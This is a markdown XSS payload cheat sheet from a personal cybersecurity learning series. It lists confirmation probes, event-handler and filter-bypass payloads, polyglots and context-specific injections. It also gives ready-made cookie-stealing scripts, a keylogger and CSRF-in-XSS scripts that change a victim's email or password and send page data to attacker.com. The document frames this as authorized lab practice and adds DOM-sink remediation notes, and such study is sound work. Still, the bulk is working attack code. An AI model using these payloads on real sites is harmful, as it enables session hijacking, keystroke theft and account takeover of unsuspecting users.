# XSS Payload Reference

> Part of the [100 Days of Cybersecurity](../README.md) challenge - Day 027

A comprehensive reference of XSS payloads organised by type and bypass technique. Use only on systems you own or have permission to test - DVWA, PortSwigger labs, XSS Game.

---

## 🧪 Basic Confirmation Payloads

First step - confirm XSS exists before attempting anything more complex.

```html
<!-- Classic alert -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Confirm context (shows which site the script runs on) -->
<script>alert(window.origin)</script>

<!-- Console log (silent - check browser dev tools) -->
<script>console.log('XSS confirmed')</script>

<!-- Visual confirmation without alert -->
<script>document.body.style.backgroundColor='red'</script>
```

---

## 🖼️ Event Handler Payloads

When `<script>` tags are filtered - event handlers often still work.

```html
<!-- Image error event (src=x always fails → triggers onerror) -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert('XSS')">
<img src=x onerror=alert(document.cookie)>

<!-- SVG onload -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert('XSS')">

<!-- Body onload -->
<body onload=alert(1)>

<!-- Input autofocus -->
<input autofocus onfocus=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- Select autofocus -->
<select autofocus onfocus=alert(1)>

<!-- Textarea autofocus -->
<textarea autofocus onfocus=alert(1)>

<!-- Details/summary toggle -->
<details open ontoggle=alert(1)>
<summary>Click</summary>
</details>

<!-- Video event -->
<video src=x onerror=alert(1)>
<video><source onerror=alert(1)>

<!-- Audio event -->
<audio src=x onerror=alert(1)>

<!-- Object event -->
<object data=x onerror=alert(1)>

<!-- Iframe load -->
<iframe onload=alert(1)>

<!-- Marquee event (old browsers) -->
<marquee onstart=alert(1)>XSS</marquee>

<!-- Mouse events (requires interaction) -->
<div onmouseover=alert(1)>Hover me</div>
<a onclick=alert(1)>Click me</a>
```

---

## 🍪 Cookie Stealing Payloads

Goal: exfiltrate session cookies to attacker-controlled server.

```html
<!-- Redirect with cookie in URL -->
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

<!-- Fetch (modern, no redirect) -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- Image beacon (tiny, stealthy) -->
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

<!-- XMLHttpRequest -->
<script>
var x = new XMLHttpRequest();
x.open('GET','https://attacker.com/steal?c='+document.cookie);
x.send();
</script>

<!-- Via event handler (when script tag filtered) -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<svg onload="new Image().src='https://attacker.com/?c='+document.cookie">

<!-- Base64 encoded cookie (evades simple keyword filters) -->
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
```

> **Note:** `HttpOnly` cookies are invisible to JavaScript - these payloads won't steal them.
> Session fixation or CSRF attacks are needed instead when HttpOnly is set.

---

## ⌨️ Keylogger Payload

Capture everything the victim types.

```html
<script>
document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
</script>

<!-- Compact version -->
<script>document.onkeydown=e=>fetch('https://attacker.com/?k='+e.key)</script>
```

---

## 🔄 Session Hijacking via CSRF-in-XSS

Perform actions as the victim using their authenticated session.

```html
<!-- Change victim's email -->
<script>
fetch('/account/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com',
  credentials: 'include'   // sends victim's cookies automatically
});
</script>

<!-- Change password -->
<script>
fetch('/account/change-password', {
  method: 'POST',
  body: JSON.stringify({password: 'hacked123'}),
  headers: {'Content-Type': 'application/json'},
  credentials: 'include'
});
</script>

<!-- Read sensitive page and exfiltrate -->
<script>
fetch('/account/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/?d=' + btoa(data)));
</script>
```

---

## 🎭 Filter Bypass Payloads

When basic payloads are blocked - try these.

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
```

### Spaces and Tabs
```html
<script >alert(1)</script >
<img	src=x	onerror=alert(1)>   <!-- tabs instead of spaces -->
```

### Broken / Malformed Tags
```html
<<script>alert(1)//<</script>
<script/src=//attacker.com/xss.js>
```

### No Quotes
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>        <!-- backtick instead of parentheses -->
<script>alert`XSS`</script>
```

### HTML Entities
```html
&lt;script&gt;alert(1)&lt;/script&gt;   <!-- sometimes decoded twice -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

### Unicode / Hex Encoding
```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

### String Concatenation
```html
<script>eval('al'+'ert(1)')</script>
<script>window['al'+'ert'](1)</script>
<script>this['al'+'ert'](1)</script>
```

### Fromcharcode
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### JavaScript URI
```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert(document.cookie)">click</a>
<iframe src="javascript:alert(1)">
```

### Data URI
```html
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

### On Error with Invalid Protocol
```html
<img src="https://" onerror=alert(1)>
```

### Srcdoc
```html
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 🏗️ Polyglot Payloads

Single payload that works in multiple injection contexts (HTML, JS string, URL, attribute).

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

--><!-
```

```javascript
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&amp;#41;>'\">
```

---

## 🌐 Context-Specific Payloads

### Inside HTML Attribute (quoted)
```html
<!-- Injection point: <input value="USER_INPUT"> -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
```

### Inside HTML Attribute (unquoted)
```html
<!-- Injection point: <input value=USER_INPUT> -->
onmouseover=alert(1)
onfocus=alert(1) autofocus
```

### Inside JavaScript String (single quoted)
```javascript
// Injection point: var x = 'USER_INPUT';
'-alert(1)-'
';alert(1)//
\';alert(1)//
```

### Inside JavaScript String (double quoted)
```javascript
// Injection point: var x = "USER_INPUT";
"-alert(1)-"
";alert(1)//
```

### Inside JavaScript (without string context)
```javascript
// Injection point: var x = USER_INPUT;
alert(1)
1;alert(1)
```

### Inside `href` Attribute
```html
<!-- Injection point: <a href="USER_INPUT"> -->
javascript:alert(1)
javascript:alert(document.cookie)
```

### Inside `src` / `data` Attributes
```html
<!-- Injection point: <script src="USER_INPUT"> -->
https://attacker.com/malicious.js

<!-- Injection point: <img src="USER_INPUT"> -->
x" onerror="alert(1)
```

---

## 🔬 DOM XSS Sinks

Common JavaScript functions that execute code - dangerous if user input reaches them.

```javascript
// Direct execution
eval(userInput)
setTimeout(userInput, 100)
setInterval(userInput, 100)
new Function(userInput)()
document.write(userInput)

// HTML rendering
element.innerHTML = userInput        // ❌ executes scripts
element.outerHTML = userInput        // ❌ executes scripts
element.insertAdjacentHTML(pos, ui)  // ❌ executes scripts
$(element).html(userInput)           // ❌ jQuery innerHTML

// URL-based
location.href = userInput            // ❌ javascript: URI
location.assign(userInput)           // ❌ javascript: URI
location.replace(userInput)          // ❌ javascript: URI

// Safe alternatives
element.textContent = userInput      // ✅ renders as text
element.innerText = userInput        // ✅ renders as text
```

---

## 🛡️ Testing Methodology

```
1. Find injection points
   → URL parameters (?q=, ?id=, ?search=)
   → Form fields (search, login, comment, profile)
   → HTTP headers (User-Agent, Referer, X-Forwarded-For)
   → JSON/API inputs

2. Determine context
   → HTML body? → try <script> and event handlers
   → HTML attribute? → try " onmouseover=
   → JavaScript string? → try ';alert(1)//
   → URL? → try javascript:alert(1)

3. Test basic payload
   → <script>alert(1)</script>

4. If blocked - identify filter
   → What was stripped? Script tags? Alert? Quotes?
   → Try bypass techniques accordingly

5. Escalate to impact
   → Cookie theft → <script>new Image().src='https://attacker.com/?c='+document.cookie</script>
   → Session action → fetch with credentials:include

6. Document for report
   → Proof of concept URL or steps
   → Screenshot of execution
   → Impact assessment
   → Remediation recommendation
```

---

## 🔧 Tools

| Tool | Use |
|------|-----|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) | Free XSS labs |
| [XSS Game by Google](https://xss-game.appspot.com/) | Beginner XSS challenges |
| [OWASP ZAP](https://www.zaproxy.org/) | Automated XSS scanner |
| [Burp Suite Pro](https://portswigger.net/burp) | Active scan + manual testing |
| [XSSHunter](https://xsshunter.trufflesecurity.com/) | Blind XSS detection |
| [dalfox](https://github.com/hahwul/dalfox) | Fast automated XSS scanner |

---

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*